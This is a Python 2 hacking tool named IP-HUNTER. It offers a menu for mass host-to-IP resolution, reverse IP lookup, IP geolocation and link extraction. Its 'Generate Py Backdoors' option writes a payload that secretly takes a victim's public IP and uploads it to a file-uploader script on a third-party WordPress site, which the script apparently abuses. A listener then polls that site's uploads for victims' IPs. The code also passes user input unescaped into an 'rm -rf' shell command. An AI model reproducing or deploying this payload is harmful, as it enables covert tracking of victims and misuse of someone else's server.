import requests,json,os,urllib,sys
W = '\033[1;37m' # White bold
N  = '\033[0m'  # white (Normal)
R = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
def main():
	print W+"	==================================="
	print "	             IP-HUNTER "
	print "	        Created By LOoLzeC"
	print R+"	   _ _  _ _  _  _  ___  ___  ___ "
	print "	  | U || | || \| ||_ _|| __|| o \\"
	print "	  |   || U ||  \\ | | | | _| |   /"
	print "	  |_n_||___||_|\_| |_| |___||_|\\\\"
	print W+"	===================================\n	      "+B+"[+] "+W+"Coded By Deray "+B+"[+]\n"+W
	print B+"  1"+R+")"+W+" Mass Dumping HOST to IP With Weblist."
	print B+"  2"+R+")"+W+" Single Ip/hostname."
	print B+"  3"+R+")"+W+" Check My Public IP Adress."
	print B+"  4"+R+")"+W+" Generate Py Backdoors To Get Public Victim's IP Adress."
	print B+"  5"+R+")"+W+" Dumping Location From Public IP Adress."
	print B+"  6"+R+")"+W+" Mass Extract Page Links From Host."
	print B+"  7"+R+")"+W+" Info."
	print B+"  8"+R+")"+W+" Bye."
	print 
	choose=raw_input(''+W+'  choose#> ')
	if "1" in choose:
		host=raw_input(W+R+'  [+] '+W+'WEB LIST>>> ')
		try:
			word=open(host).readlines()
			hasil=len(word)
			print W+B+"  [*] "+W+R+str(hasil)+W+" HOST Loaded!"
			print W+B+"  [*] "+W+"Dumping IP from "+W+R+host+" "+W+"...\n"
			ww=open(host)
			for k in range(hasil):
				wordlist=ww.readline().replace('\n','')
				try:
					kkk=requests.get('http://ip-api.com/json/'+wordlist+'')
					OoO=json.loads(kkk.text)
					try:
						print W+R+"  [+] "+W+wordlist+R+" ========> "+W+"",OoO["query"]
					except:
						print W+R+"  [-] "+wordlist+" ========> Unknown!"
				except:
					print W+R+"  [-] Fuck ur connections!"
					raw_input(W+R+'  [!] '+W+'Press enter to menu...')
					os.system('clear')
					main()
			print W+B+"\n  [*] "+W+"Finished."
			raw_input(W+R+'  [!] '+W+'Press enter to menu...')
			os.system('clear')
			main()
		except:
			print W+R+"  [-] OH F*ck! List '"+host+"' Not Found Bitch."
			raw_input('  [!] '+W+'Press enter to menu...')
			os.system('clear')
			main()
		
	elif "2" in choose:
		target=raw_input(W+R+'  [+] '+W+'TARGET IP OR HOSTNAME>>> ')
		print 
		line="="*10
		print W+R+"  ["+line+W+" Host "+target+R+" "+line+"]"
		print 
		print W+B+"  1"+W+R+") "+W+"Get Ip From"+W+R+"",target
		print W+B+"  2"+W+R+")"+W+" Get Host+IP From"+W+R+"",target
		print W+B+"  3"+W+R+")"+W+" Get Host+IP+LOCATION from"+W+R+"",target
		print 
		pilih=raw_input(W+'  choose> ')
		if "1" in pilih:
			print W+B+"  [*] "+W+"Getting Ip From "+W+R+target+" ...\n"
			try:
				print R+"  [+]"+W+" IP :"+W+G+"", requests.get('http://ip-api.com/json/'+target+'').json()["query"]
			except:
				print W+R+"\n  [-] Fuck ur connections!"
				raw_input('  [!]'+W+' Press enter to menu...')
				os.system('clear')
				main()
			print W+B+"\n  [*] "+W+"Finished."
			raw_input(R+'  [!] '+W+'Press enter to menu...')
			os.system('clear')
			main()
		elif "2" in pilih:
			print W+B+"  [*] "+W+"Getting HOST from "+R+target+" ..."
			rr=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+target+'')
			if "error" in rr.text:
				print W+R+"  [-] "+W+"Host => "+R+"Unknown!"
				print W+R+"  [-] "+W+"Please Input Host Without http or https"
				print W+B+"  [*] "+W+"Example : "+B+"site.com"
				print W+B+"  [*] "+W+"Byeee."
				raw_input(R+'  [!]'+W+' Press enter to menu...')
				os.system('clear')
				main()
			else:
				print W+B+"  [*] "+W+"Saving Host Result From "+R+target+" ..."
				name='reverse_from_'+target+'.txt'
				try:
					os.mkdir('reverse')
					filename=open('reverse/'+name+'','w')
				except:
					filename=open('reverse/'+name+'','w')
				filename.write(rr.text)
				filename.close()
				print W+B+"  [*]"+W+" Writted! Saved To :"+R+"",name
				print 
				print W+B+"  [*] "+W+"Dumping IP from List"+R+"",name
				buka=open('reverse/'+name).readlines()
				total=len(buka)
				print W+B+"  [*] "+R+str(total)+W+" Host Loaded From"+R+"",name
				print 
				lanjut=open('reverse/'+name)
				for k in range(total):
					list=lanjut.readline().replace('\n','')
					req=requests.get('http://ip-api.com/json/'+list+'')
					js=json.loads(req.text)
					try:
						print W+R+"  [+]"+W+" http://"+list+R+" ==========>"+W+"",js["query"]
					except:
						print W+R+"  [-] http://"+list+" ==========> Unknown!"
				print W+B+"\n  [*] "+W+"Finished."
				print W+B+"  [*] "+W+"Host Result Saved To => "+R+"/reverse/"+name
				print W+B+"  [*]"+W+" Bye."
				raw_input(R+'  [!]'+W+' Press enter to menu...')
				os.system('clear')
				main()
				
		elif "3" in pilih:
			print W+B+"  [*]"+W+" Getting HOST from "+R+target+" ..."
			rock=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+target+'')
			if "error" in rock.text:
				print W+R+"  [-] "+W+"Host => "+R+"Unknown!"
				print W+R+"  [-] "+W+"Please Input Host Without http or https"
				print W+R+"  [*]"+W+" Example : site.com"
				print W+B+"  [*]"+W+" Byeee."
				raw_input(R+'  [!]'+W+' Press enter to menu...')
				os.system('clear')
				main()
			else:
				ok=open('lock.txt','w')
				ok.write(rock.text)
				ok.close()
				print W+B+"  [*]"+W+" Captured!"
				print W+B+"\n  [*]"+W+" Getting Host+IP+LOCATION From "+R+target+" ..."
				oy=open('lock.txt').readlines()
				h=len(oy)
				print W+B+"  [*] "+W+R+str(h)+W+" Host Loaded!\n"
				wo=open('lock.txt')
				for k in range(h):
					w=wo.readline().replace('\n','')
					try:
						k=requests.get('http://ip-api.com/json/'+w+'')
						if "No" in k.text:
							print W+R+"  [-] "+W+"Host =>"+R+" Unknown!"
							print W+R+"  [-]"+W+" Please Input Host Without http or https"
							print W+B+"  [*]"+W+" Example :"+R+" site.com"
							print W+B+"  [*]"+W+" Byeee."
							raw_input(R+'  [!]'+W+' Press enter to menu...')
							os.system('rm -rf host+lock')
							os.system('clear')
							main()
						else:
							p=json.loads(k.text)
							rk=requests.get('http://ipapi.co/'+p["query"]+'/json/')
							r=json.loads(rk.text)
							try:
								lines="="*40
								print "  "+lines
								print W+R+"\n  [+]"+W+" HOST :"+R+" http://"+w
								print W+B+"\n  [*]"+W+" IP\t\t:"+R+"",r["ip"]
								print W+B+"  [*] "+W+"City\t\t:"+R+"",r["city"]
								print W+B+"  [*] "+W+"Region Code\t:"+R+"",r["region_code"]
								print W+B+"  [*]"+W+" Country\t\t:"+R+"",r["country"]
								print W+B+"  [*]"+W+" Country Name\t:"+R+"",r["country_name"]
								print W+B+"  [*]"+W+" Region\t\t:"+R+"",r["region"]
								print W+B+"  [*] "+W+"Lang\t\t:"+R+"",r["languages"]
								print W+B+"  [*]"+W+" Calling Code\t:"+R+"",r["country_calling_code"]
								print W+B+"  [*]"+W+" Utc Offset\t:"+R+"",r["utc_offset"]
								print W+B+"  [*]"+W+" Continent Code\t:"+R+"",r["continent_code"]
								print W+B+"  [*]"+W+" Currency\t\t:"+R+"",r["currency"]
								print W+B+"  [*]"+W+" Latitude\t\t:"+R+"",r["latitude"]
								print W+B+"  [*]"+W+" Longitude\t\t:"+R+"",r["longitude"]
								print W+B+"  [*]"+W+" Timezone\t\t:"+R+"",r["timezone"]
								print W+B+"  [*]"+W+" Postal\t\t:"+R+"",r["postal"]
								print W+B+"  [*]"+W+" In Eu\t\t:"+R+"",r["in_eu"]
							except:
								print W+R+"  [-] HOST : "+w+" ==> Unknown!"
					except:
						print W+R+"  [-] Check Ur Connections!"
						os.system('rm -rf lock.txt')
						raw_input('  [!] '+W+'Press enter to menu ... ')
						os.system('clear')
						main()
				print W+B+"\n  [*] "+W+"Finished."
				os.system('rm -rf lock.txt')
				raw_input(R+'  [!] '+W+'Press enter to menu...')
				os.system('clear')
				main()
			
		else:
			print W+R+"  [-] Input Failed!"
			raw_input('  [!]'+W+' Press enter to menu...')
			os.system('clear')
			main()
	elif "3" in choose:
		print B+"  [*] "+W+"Checking your public IP adress ..."
		print W+R+"  [+] "+W+"Your public IP adress is : "+G+requests.get('http://ip-api.com/json/').json()["query"]
		print B+"  [*] "+W+"Finished."
		raw_input(W+R+"  [!] "+W+"Press enter to menu ...")
		os.system('clear')
		main()
	elif "4" in choose:
		lines="="*10
		print ""+R+"\n  ["+lines+W+" Generate Py Backdoors "+R+lines+"]\n"
		print W+B+"  1"+W+R+")"+W+" Generate Payload"
		print W+B+"  2"+W+R+")"+W+" Listeners\n"
		cos=raw_input('  choose> ')
		if "1" in cos:
			payload=raw_input(W+B+'  [*] '+W+'Example: mypayload\n '+R+' [+] '+W+'Payload Name>>> ')
			date=raw_input(W+B+'  [*]'+W+' Example: 2018/09\n '+R+' [+] '+W+'Date>>> ')
			print W+B+"  [*]"+W+" Generating Payload ..."
			try:
				os.mkdir('payload')
				f=open('payload/payload.py','w')
			except:
				f=open('payload/payload.py','w')
			f.write('import requests,json\n')
			f.write('payload = "'+payload+'.txt"\n')
			f.write('r=requests.get("http://ip-api.com/json/")\n')
			f.write('data=json.loads(r.text)\n')
			f.write('postip=data["query"]\n')
			f.write("files={'Filedata':(payload,postip,'text/html')}\n")
			f.write('try:\n')
			f.write("	r=requests.post('http://ailisgarcia.com/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',verify = False,files=files)\n")
			f.write('except:\n')
			f.write('	print "[-] Connection Reset By Peer!" \n')
			f.close()
			od=os.path.getsize('payload/payload.py')
			print W+B+"  [*] "+W+"Payload Created "+R+str(od)+W+" bytes ..."
			print W+B+"  [*] "+W+"Path :"+R+" /payload/payload.py"
			print 
			tanya=raw_input(W+B+'  [*]'+W+' Listen Now? Y/N : ')
			if tanya == 'y' or tanya == 'Y' or tanya == 'yes' or tanya == 'YES':
				rs=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+payload+'.txt')
				if rs.status_code == 200:
					print W+B+"  [*] "+W+"Sessions Opened ..."
					print W+R+"  [+] "+W+"IP :"+G+" "+rs.text
					for k in range(1,99999):
						path='http://ailisgarcia.com/wp-content/uploads/'+date+'/'+payload+'-'+str(k)+'.txt'
						try:
							r=requests.get(path)
							if r.status_code == 200:
								print W+B+"  [*]"+W+" Sessions "+R+str(k)+W+" Opened ..."
								print W+R+"  [+]"+W+" IP : "+G+r.text
							else:
								print W+R+"  [-] Listening Payload "+W+R+payload+" ..."
						except:
							print W+R+"  [*] Check Ur Connections!"
							raw_input('  [!] '+W+'Press enter to menu ... ')
							os.system('clear')
							main()
				else:
					while True:
						r=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+payload+'.txt')
						if r.status_code == 200:
							print W+B+"  [*]"+W+" Sessions Opened .."
							print R+"  [+]"+W+" IP : "+G+r.text
							raw_input(W+R'  [!]'+W+' Press enter to menu ... ')
							os.system('clear')
							main()
						else:
							print W+R+"  [-] Listening Payload "+payload+" ..."
			elif tanya == 'n' or tanya == 'N' or tanya == 'no' or tanya == 'NO':
				raw_input(W+R+'  [!]'+W+' Press enter to menu ... ')
				os.system('clear')
				main()
			else:
				print W+R+"  [-] Input Failed!"
				raw_input('  [!]'+W+' Press enter to menu .. ')
				os.system('clear')
				main()
		elif "2" in cos:
			payload=raw_input(W+R+'  [+]'+W+' Payload> ')
			date=raw_input(R+'  [*]'+W+' Date> ')
			rs=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+payload+'.txt')
			if rs.status_code == 200:
				print W+B+"  [*]"+W+" Sessions Opened ..."
				print R+"  [+]"+W+" IP : "+G+rs.text
				for k in range(1,99999):
					path='http://ailisgarcia.com/wp-content/uploads/'+date+'/'+payload+'-'+str(k)+'.txt'
					try:
						r=requests.get(path)
						if r.status_code == 200:
							print W+B+"  [*] "+W+"Sessions "+R+str(k)+W+" Opened ..."
							print R+"  [+] "+W+"IP : "+G+r.text
						else:
							print W+R+"  [-] Listening Payload "+payload+" ..."
					except:
						print W+R+"  [*] "+W+"Check Ur Connections!"
						raw_input(R+'  [!] '+W+'Press enter to menu ... ')
						os.system('clear')
						main()
			else:
				while True:
					r=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+payload+'.txt')
					if r.status_code == 200:
						print W+B+"  [*] "+W+"Sessions Opened .."
						print W+R+"  [+]"+W+" IP : "+G+r.text
						print R+"  [!]"+W+" Press enter to menu ... "
						os.system('clear')
						main()
					else:
						print W+R+"  [-] Listening Payload "+payload+" ..."
			
		else:
			print W+R+"  [-] Input Failed!"
			raw_input('  [!]'+W+' Press enter to menu...')
			os.system('clear')
			main()
	elif "5"  in choose:
		ln="="*10
		print 
		print W+R+"  ["+ln+W+" Select Menu "+R+ln+"]"
		print 
		print W+B+"  1"+W+R+")"+W+" Manual"
		print W+B+"  2"+W+R+")"+W+" Mass\n"
		t=raw_input('  choose> ')
		if "1" in t:
			ip=raw_input(W+R+'  [*]'+W+' IP>>> ')
			print W+B+"  [*]"+W+" Tracking IP "+R+ip+" ..."
			rk=requests.get('http://ipapi.co/'+ip+'/json/')
			r=json.loads(rk.text)
			try:
				lines="="*40
				print "  "+lines
				
				
				print W+B+"\n  [*]"+W+" IP\t\t:"+R+"",r["ip"]
				print W+B+"  [*] "+W+"City\t\t:"+R+"",r["city"]
				print W+B+"  [*] "+W+"Region Code\t:"+R+"",r["region_code"]
				print W+B+"  [*]"+W+" Country\t\t:"+R+"",r["country"]
				print W+B+"  [*]"+W+" Country Name\t:"+R+"",r["country_name"]
				print W+B+"  [*]"+W+" Region\t\t:"+R+"",r["region"]
				print W+B+"  [*] "+W+"Lang\t\t:"+R+"",r["languages"]
				print W+B+"  [*]"+W+" Calling Code\t:"+R+"",r["country_calling_code"]
				print W+B+"  [*]"+W+" Utc Offset\t:"+R+"",r["utc_offset"]
				print W+B+"  [*]"+W+" Continent Code\t:"+R+"",r["continent_code"]
				print W+B+"  [*]"+W+" Currency\t\t:"+R+"",r["currency"]
				print W+B+"  [*]"+W+" Latitude\t\t:"+R+"",r["latitude"]
				print W+B+"  [*]"+W+" Longitude\t\t:"+R+"",r["longitude"]
				print W+B+"  [*]"+W+" Timezone\t\t:"+R+"",r["timezone"]
				print W+B+"  [*]"+W+" Postal\t\t:"+R+"",r["postal"]
				print W+B+"  [*]"+W+" In Eu\t\t:"+R+"",r["in_eu"]
				print "\n"+W+B+"[*]"+W+" Finished."
				raw_input(R+'[!]'+W+' Press enter to menu ... ')
				os.system('clear')
				main()
			except:
				print W+R+"  [-] HOST : "+w+" ==> Unknown!"
				print "\n"+W+B+"[*]"+W+" Finished."
				raw_input(R+'[!]'+W+' Press enter to menu ... ')
				os.system('clear')
				main()

		elif "2" in t:
			ip=raw_input(W+R+'  [*]'+W+' IP LIST>>> ')
			try:
				vk=open(ip).readlines()
				vko=len(vk)
				vki=open(ip)
				for k in range(vko):
					word=vki.readline().replace('\n','')
					rk=requests.get('http://ipapi.co/'+word+'/json/')
					r=json.loads(rk.text)
					try:
						lines="="*40
						print "  "+lines
						print W+B+"  [*] Tracking IP "+W+R+word+" ..."
						print W+B+"\n  [*]"+W+" IP\t\t:"+R+"",r["ip"]
						print W+B+"  [*] "+W+"City\t\t:"+R+"",r["city"]
						print W+B+"  [*] "+W+"Region Code\t:"+R+"",r["region_code"]
						print W+B+"  [*]"+W+" Country\t\t:"+R+"",r["country"]
						print W+B+"  [*]"+W+" Country Name\t:"+R+"",r["country_name"]
						print W+B+"  [*]"+W+" Region\t\t:"+R+"",r["region"]
						print W+B+"  [*] "+W+"Lang\t\t:"+R+"",r["languages"]
						print W+B+"  [*]"+W+" Calling Code\t:"+R+"",r["country_calling_code"]
						print W+B+"  [*]"+W+" Utc Offset\t:"+R+"",r["utc_offset"]
						print W+B+"  [*]"+W+" Continent Code\t:"+R+"",r["continent_code"]
						print W+B+"  [*]"+W+" Currency\t\t:"+R+"",r["currency"]
						print W+B+"  [*]"+W+" Latitude\t\t:"+R+"",r["latitude"]
						print W+B+"  [*]"+W+" Longitude\t\t:"+R+"",r["longitude"]
						print W+B+"  [*]"+W+" Timezone\t\t:"+R+"",r["timezone"]
						print W+B+"  [*]"+W+" Postal\t\t:"+R+"",r["postal"]
						print W+B+"  [*]"+W+" In Eu\t\t:"+R+"",r["in_eu"]
					except:
						print W+R+"  [-] HOST : "+w+" ==> Unknown!"
				print W+B+"  [*]"+W+" Finished."
				raw_input(R+'  [!]'+W+' Press enter to menu ...')
				os.system('clear')
				main()
			except:
				print W+R+"  [-] OH F*ck! List '"+ip+"' Not Found Bitch."
				raw_input('  [!]'+W+' Press enter to menu...')
				os.system('clear')
				main()
		
	elif "6" in choose:
		host=raw_input(W+R+'  [+]'+W+' HOST>>> ')
		print W+B+"  [*]"+W+" Getting Host From "+R+host+" ... "
		rr=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+host+'')
		f=open(''+host+'.txt','w')
		f.write(rr.text)
		f.close()
		h=open(host+'.txt').readlines()
		k=len(h)
		print W+B+"  [*] "+R+str(k)+W+" Host Loaded!"
		print W+B+"  [*] "+W+"Extracting Links From "+R+host
		d=open(host+'.txt')
		for ps in range(k):
			l=d.readline().replace('\n','')
			r=requests.get('https://api.hackertarget.com/pagelinks/?q='+l+'')
			if "no links found" in r.text:
				lines="="*10
				print W+R+" ["+lines+" "+l+" No Links Found! "+lines+"]"
			elif "input url is invalid" in r.text:
				print R+"  [-] "+r.text
				os.system('rm -rf '+host+'.txt')
				raw_input(R+'  [!]'+W+' Press enter to menu ...')
				os.system('rm -rf '+host+'.txt')
				os.system('clear')
				main()
				
			else:
				lined="="*10
				print W+R+" ["+lined+" "+W+l+" "+R+lined+"]\n"
				print W+r.text
		print W+B+"\n  [*]"+W+" Finished."
		os.system('rm -rf '+host+'.txt')
		raw_input(W+R+'  [!] '+W+'Press enter to menu ...')
		os.system('clear')
		main()
	
	elif "7" in choose:
		print R+"""  ==================================================
  [*] Tittle\t\t: IP-HUNTER
  [*] Coder\t\t: Deray
  [*] Insta\t\t: @Reyy05_
  [*] FaceBk\t\t: Deray
  [*] Github\t\t: https://github.com/LOoLzeC
  
  (C) Copyright 2018 LOoLzeC Security
  =================================================="""
  		raw_input('  [!] '+W+' Press enter to menu ...')
  		os.system('clear')
  		main()
  		
  
  
	elif "8" in choose:
		sys.exit(W+B+'  [++ Exiting... \(^_^) Byee.'+N+'') 
	else:
		print "  [-] Input Failed!"
		raw_input('  [!] Press enter to menu...')
		os.system('clear')
		main()
				
if __name__ == "__main__":
	main()
